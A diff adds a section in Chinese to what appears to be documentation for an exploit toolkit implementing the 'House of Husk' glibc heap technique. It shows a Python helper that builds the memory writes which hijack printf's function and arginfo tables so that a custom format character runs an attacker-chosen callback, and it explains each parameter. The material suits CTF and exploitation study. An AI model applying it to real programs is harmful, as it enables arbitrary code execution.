@@ -45,6 +45,31 @@
 
 上面 5 个完整投递 PoC 都是用 largebin attack 先后改写两张表，不是靠官方注册 API；通用最终触发点 PoC 则反过来故意用官方 API，单独证明 2.42/2.43 仍然存在消费路径。
 
+## Python 离线板子
+
+```python
+from husk import build_house_of_husk
+
+writes = build_house_of_husk(
+    printf_function_table_addr=libc_function_table,
+    printf_arginfo_table_addr=libc_arginfo_table,
+    function_table_data_addr=fake_function_table,
+    arginfo_table_data_addr=fake_arginfo_table,
+    format_char=ord("X"),
+    handler_addr=callback,
+)
+```
+
+| 参数 | 含义 |
+|---|---|
+| `printf_function_table_addr` / `printf_arginfo_table_addr` | libc 中两张隐藏全局表指针地址，必须按目标 Build ID 解析。 |
+| `function_table_data_addr` / `arginfo_table_data_addr` | 两张独立伪表的可写地址，不能共用一个地址。 |
+| `format_char` | 触发 printf handler 的格式字符 ASCII 值。 |
+| `handler_addr` | 伪 arginfo 表对应槽位的 callback 地址。 |
+| `slot_bias` | 表索引偏移，PoC 默认值为 2；若目标源码/构建不同，显式修改。 |
+
+返回三项 `MemoryWrite`：两张全局表指针和 arginfo 表对应槽位。函数不负责 largebin 投递、格式串触发或 Build ID 偏移解析。
+
 ## 迁移与调试
 
 1. 先确认投递路径和最终触发点在目标 Build ID 中是否都存在。
